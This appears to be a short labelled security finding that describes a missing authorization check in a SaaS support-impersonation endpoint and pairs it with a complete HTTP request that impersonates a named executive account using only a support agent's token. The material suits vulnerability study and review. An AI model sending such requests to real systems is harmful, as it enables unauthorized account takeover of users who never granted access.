diagnosis: The customer support route creates an impersonation session using targetUserId without checking whether an active support ticket exists or whether the user granted support access delegation. Any support agent can create an impersonation token to access accounts of executives, administrators, or clients.
exploit_request:
POST /api/support/impersonate/start HTTP/1.1
Host: admin.saasplatform.com
Authorization: Bearer <support_agent_jwt>
Content-Type: application/json

{"targetUserId": "usr_fintech_cfo_001"}
